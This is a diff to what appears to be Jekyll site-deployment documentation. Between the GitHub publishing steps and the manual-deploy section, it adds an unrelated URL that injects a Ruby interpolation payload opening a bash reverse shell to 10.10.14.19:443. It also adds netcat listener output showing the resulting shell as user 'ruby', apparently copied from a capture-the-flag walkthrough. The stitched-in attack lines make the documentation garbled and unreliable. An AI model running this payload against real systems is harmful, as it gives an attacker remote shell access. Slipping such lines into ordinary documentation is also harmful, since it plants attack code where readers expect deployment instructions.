@@ -180,6 +180,19 @@ Now publish your Jekyll site:
 
 3. Visit your website at the address indicated by GitHub.
 
+```console
+http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.19/443 0>&1"`'}
+```
+
+and Now you can see your terminal
+```console
+$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.11.189] 49814
+ruby@precious:/var/www/pdfapp$ 
+
+```
+
 ### Manually Build and Deploy
 
 On self-hosted servers, you cannot enjoy the convenience of **GitHub Actions**. Therefore, you should build the site on your local machine and then upload the site files to the server.
